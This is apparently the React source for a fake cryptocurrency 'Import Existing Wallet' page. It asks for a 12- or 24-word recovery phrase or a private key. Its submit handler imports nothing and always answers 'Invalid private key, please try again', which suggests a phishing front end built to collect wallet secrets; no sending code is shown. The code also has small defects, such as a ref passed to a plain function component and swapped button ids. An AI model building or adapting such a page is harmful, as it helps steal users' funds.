import { useRef, useState, type FormEvent } from "react";
import { Link } from "react-router";

const tabData = [
    { type: "phrase-12", label: "12 word" },
    { type: "phrase-24", label: "24 word" },
    { type: "phrase-key", label: "Private key" },
]

type WordFieldProps = {
    index: number;
    value: string;
    onChange: (index: number, value: string) => void;
    onKeyDown: (e: React.KeyboardEvent<HTMLInputElement>, index: number) => void;
    onPaste: (e: React.ClipboardEvent<HTMLInputElement>, index: number) => void;
};

function WordField({ index, value, onChange, onKeyDown, onPaste }: WordFieldProps) {
    const [show, setShow] = useState(false);

    return (
        <div className="login__field-item">
            <div className="login__field-number">{index + 1}.</div>
            <input
                type={show ? "text" : "password"}
                name={`word${index + 1}`}
                className="login__input js-login-field"
                value={value}
                onChange={(e) => onChange(index, e.target.value)}
                onFocus={() => setShow(true)}
                onBlur={() => setShow(false)}
                onKeyDown={(e) => onKeyDown(e, index)}
                onPaste={(e) => onPaste(e, index)}
            />
        </div>
    );
}

type HdPathPopupProps = {
    visible: boolean;
    onClose: () => void;
};

function HdPathPopup({ visible, onClose }: HdPathPopupProps) {
    const [inputs, setInputs] = useState(["0", "0", "0"]);
    const [confirmVisible, setConfirmVisible] = useState(false);

    if (!visible) return null;

    const handleChange = (i: number, value: string) => {
        const cleaned = value.replace(/[^0-9.]/g, "");
        const dots = cleaned.split(".").length - 1;
        const finalValue = dots > 1 ? cleaned.split(".")[0] + "." + cleaned.split(".").slice(1).join("") : cleaned;

        setInputs((prev) => prev.map((v, idx) => (idx === i ? finalValue : v)));
    };

    const handleClose = () => setConfirmVisible(true);
    const handleYes = () => {
        setInputs(["0", "0", "0"]);
        setConfirmVisible(false);
        onClose();
    };
    const handleCancel = () => setConfirmVisible(false);

    return (
        <div className="popup">
            <button className="popup__close-btn btn" type="button" onClick={handleClose}>
                ✕
            </button>
            <div className="popup__title">Set Custom Derivation Path</div>
            <div className="popup__desc">
                <span>•</span>You can create multiple addresses from one recovery phrase
                <br />
                <span>•</span>A lost path cannot be recovered
                <br />
                <span>•</span>If you're unfamiliar with this feature, skip or undo this step - Reset Settings
            </div>
            <div className="popup__bottom-fields">
                <span>m/-'/-'/</span>
                {inputs.map((v, i) => (
                    <span key={i}>
                        <input
                            className="input js-popup-input js-field"
                            value={v}
                            onChange={(e) => handleChange(i, e.target.value)}
                        />
                        {i < 2 && <span className="popup__separator">'/</span>}
                    </span>
                ))}
            </div>

            {confirmVisible && (
                <div className="global-popup">
                    <div className="global-popup__wrapper">
                        <div className="global-popup__text">Closing this box will reset the HD Path. Are you sure you want to proceed?</div>
                        <div className="global-popup__btns">
                            <button id="yes" className="btn global-popup__btn global-popup__btn-grey" onClick={handleCancel}>
                                Cancel
                            </button>
                            <button id="cancel" className="btn global-popup__btn global-popup__btn-blue" onClick={handleYes}>
                                Yes
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}


export default function Phrase() {
    const [activeType, setActiveType] = useState("phrase-12");
    const [words, setWords] = useState(Array(24).fill(""));
    const [key, setKey] = useState("");
    const [hdPathVisible, setHdPathVisible] = useState(false);

    const wordCount = activeType === "phrase-12" ? 12 : 24;
    const inputsRef = useRef<Array<HTMLInputElement | null>>([]);

    const handleWordChange = (index: number, value: string) => {
        const newWords = [...words];
        newWords[index] = value;
        setWords(newWords);
    };

    const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
        if (e.key === " ") {
            e.preventDefault();
            const next = inputsRef.current[index + 1];
            if (next) next.focus();
        }
    };

    const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>, index: number) => {
        e.preventDefault();
        const pasted = e.clipboardData.getData("text").trim().split(/\s+/);
        const newWords = [...words];
        pasted.forEach((word, i) => {
            if (index + i < newWords.length) newWords[index + i] = word;
        });
        setWords(newWords);
    };

    const handleSubmit = (e: FormEvent) => {
        e.preventDefault();
        window.alert('Invalid private key\nPlease check your key and try again!');
    };

    return (
        <div className="login">
            <div className="outer-container">
                <div className="help-desc">
                    <span>Help Desk</span>
                    <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M36 18C36 27.9411 27.9411 36 18 36C8.05887 36 0 27.9411 0 18C0 8.05887 8.05887 0 18 0C27.9411 0 36 8.05887 36 18Z"
                            fill="#2E2D32" />
                        <path d="M16.4197 20.4375V20.2045C16.4197 19.5606 16.4728 19.0473 16.5788 18.6648C16.6887 18.2822 16.8478 17.9754 17.0561 17.7443C17.2644 17.5095 17.5182 17.2955 17.8175 17.1023C18.0561 16.9508 18.2682 16.7973 18.4538 16.642C18.6432 16.483 18.7929 16.3125 18.9027 16.1307C19.0125 15.9489 19.0675 15.7424 19.0675 15.5114C19.0675 15.2879 19.0144 15.0909 18.9084 14.9205C18.8023 14.75 18.6565 14.6193 18.4709 14.5284C18.2891 14.4337 18.0864 14.3864 17.8629 14.3864C17.6394 14.3864 17.4292 14.4375 17.2322 14.5398C17.0391 14.642 16.88 14.7879 16.755 14.9773C16.6338 15.1629 16.5713 15.3883 16.5675 15.6534H13.9538C13.9652 14.858 14.1489 14.2064 14.505 13.6989C14.8648 13.1913 15.3402 12.8163 15.9311 12.5739C16.522 12.3277 17.1735 12.2045 17.8857 12.2045C18.666 12.2045 19.3591 12.3258 19.9652 12.5682C20.575 12.8106 21.0542 13.1686 21.4027 13.642C21.7512 14.1155 21.9254 14.6951 21.9254 15.3807C21.9254 15.8314 21.8497 16.2292 21.6982 16.5739C21.5466 16.9186 21.3345 17.2235 21.0618 17.4886C20.7929 17.75 20.4766 17.9886 20.1129 18.2045C19.8288 18.3712 19.5921 18.5455 19.4027 18.7273C19.2171 18.9091 19.0769 19.1174 18.9822 19.3523C18.8875 19.5833 18.8402 19.8674 18.8402 20.2045V20.4375H16.4197ZM17.6754 24.1648C17.2663 24.1648 16.916 24.0208 16.6243 23.733C16.3364 23.4451 16.1944 23.0966 16.1982 22.6875C16.1944 22.286 16.3364 21.9432 16.6243 21.6591C16.916 21.3712 17.2663 21.2273 17.6754 21.2273C18.0656 21.2273 18.4084 21.3712 18.7038 21.6591C18.9993 21.9432 19.1489 22.286 19.1527 22.6875C19.1489 22.9602 19.0769 23.2083 18.9368 23.4318C18.8004 23.6553 18.6205 23.8333 18.397 23.9659C18.1773 24.0985 17.9368 24.1648 17.6754 24.1648Z"
                            fill="#CFCFCF" />
                    </svg>
                </div>
            </div>

            <div className="container">
                <Link to="/login" className="back-btn">
                    <svg width="14" height="12" viewBox="0 0 14 12" fill="none">
                        <path
                            d="M12.625 6H1.375M1.375 6L6.4375 11.0625M1.375 6L6.4375 0.9375"
                            stroke="#ABABB5"
                            strokeWidth="1.875"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                        />
                    </svg>
                </Link>

                <div className="step">Step 1/3</div>
                <h1 className="login__title">Import Existing Wallet</h1>
                <div className="login__desc">
                    <span>•</span>Enter your recovery phrase here to restore your wallet. Or click on any blank and paste the entire
                    phrase.
                    <br />
                    <span>•</span>Enter the phrase in the right order without capitalization, punctuation symbols, or spaces.
                </div>

                <div className={`inner-container ${wordCount === 24 ? 'inner-container-wide' : ''}`} id="inner-container">
                    <div className="switch">
                        {tabData.map((tab) => (
                            <button
                                key={tab.type}
                                type="button"
                                className={`switch__item ${activeType === tab.type ? "switch__item--active" : ""}`}
                                onClick={() => setActiveType(tab.type)}
                            >
                                {tab.label}
                            </button>
                        ))}
                    </div>

                    {activeType !== "phrase-key" ? (
                        <form className="login__form" onSubmit={handleSubmit}>
                            <div className={`login__fields ${wordCount === 24 ? 'login__fields-24' : ''}`}>
                                {Array.from({ length: wordCount }).map((_, i) => (
                                    <WordField
                                        key={i}
                                        index={i}
                                        value={words[i]}
                                        onChange={handleWordChange}
                                        onKeyDown={handleKeyDown}
                                        onPaste={handlePaste}
                                        ref={(el) => (inputsRef.current[i] = el)}
                                    />
                                ))}
                            </div>

                            {!hdPathVisible && <button type="button" className="btn login__path-btn" onClick={() => setHdPathVisible(true)}>
                                Set Derivation Path (Advanced)
                            </button>}
                            <HdPathPopup visible={hdPathVisible} onClose={() => setHdPathVisible(false)} />

                            <button type="submit" className="login__submit-btn btn btn--one" disabled={!words.slice(0, wordCount).every(Boolean)}>
                                Import
                            </button>
                        </form>
                    ) : (
                        <form className="login__form" onSubmit={handleSubmit}>
                            <input type="text" id="key" className="input" value={key} onChange={(e) => setKey(e.target.value)} />
                            <button type="submit" className="login__submit-btn btn btn--one" disabled={!key}>
                                Import
                            </button>
                        </form>
                    )}
                </div>
            </div>

        </div>
    );
}